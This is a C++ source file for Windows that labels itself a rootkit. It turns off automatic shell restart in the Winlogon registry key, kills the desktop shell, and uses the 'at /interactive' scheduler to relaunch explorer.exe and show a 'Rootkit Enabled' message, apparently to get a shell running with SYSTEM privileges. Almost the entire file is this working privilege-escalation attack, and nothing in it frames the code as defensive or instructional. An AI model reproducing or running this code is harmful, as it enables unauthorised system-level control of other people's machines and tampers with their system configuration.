#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <unistd.h>
#include <time.h>
#include <string>
#include <cstring>
#include <cmath>

int run_command(STARTUPINFO* si, PROCESS_INFORMATION* pi, char* command) 
{
    if (!CreateProcess(NULL,   // No module name (use command line)
        ((LPSTR) command),        // file to run
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        si,            // Pointer to STARTUPINFO structure
        pi)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        int error = GetLastError();
        puts("=======================");
        printf("Rootkit failed (%d).\n", error);
        puts(command);
        puts("=======================");
        return error;
    }
    return 0;
}

char* get_incremented_time(int minutes_from_now)
{
    // C++ time is just awful
    // Returns HH:MM:(SS+10)
    // http://www.cplusplus.com/reference/ctime/strftime/
    time_t rawtime;
    struct tm * timeinfo;
    char* buffer = new char[9];

    time (&rawtime);
    timeinfo = localtime (&rawtime);

    // Might not trigger if too soon
    if(timeinfo->tm_sec < 50)
    {
        timeinfo->tm_min += minutes_from_now;
    } 
    else 
    {
        timeinfo->tm_min += minutes_from_now+1;
    }

    if(timeinfo->tm_min >= 60)
    {
        timeinfo->tm_hour += floor(timeinfo->tm_min / 60);
        timeinfo->tm_min = timeinfo->tm_min % 60;
    }

    if(timeinfo->tm_hour > 23)
    {
        timeinfo->tm_hour = 0;
    }

    strftime (buffer, 6, "%H:%M", timeinfo);

    return buffer;
}

char* create_schedule_string(char* command, char* time)
{
    // 2047 is max cmd command length
    char* command_Schedule = new char[2047];
    strcpy(command_Schedule, "at ");
    strcat(command_Schedule, time);
    strcat(command_Schedule, " /interactive ");
    strcat(command_Schedule, command);

    return command_Schedule;
}

int main( )
{
	// ::ShowWindow(::GetConsoleWindow(), SW_HIDE); 
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );    

    char command_KillExplorer[] = "tskill /A explorer";
    char command_StopShellRestart[] = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /t REG_DWORD /V \"AutoRestartShell\" /d 0 /f";
    // Might need a better way to get sessionID, for now 0 works
    char command_Msg[] = "msg 0 \"Rootkit Enabled\"";
    char command_OpenExplorer[] = "explorer.exe";

    char* time = get_incremented_time(1);
    char* schedule_Msg = create_schedule_string(command_Msg, time);
    char* schedule_Explorer = create_schedule_string(command_OpenExplorer, time);

    run_command(&si, &pi, command_StopShellRestart);
    run_command(&si, &pi, command_KillExplorer);
    // run_command(&si, &pi, command_Msg);
    run_command(&si, &pi, schedule_Msg);
    run_command(&si, &pi, schedule_Explorer);

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Cleanup
    delete time;

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    return 0;
}
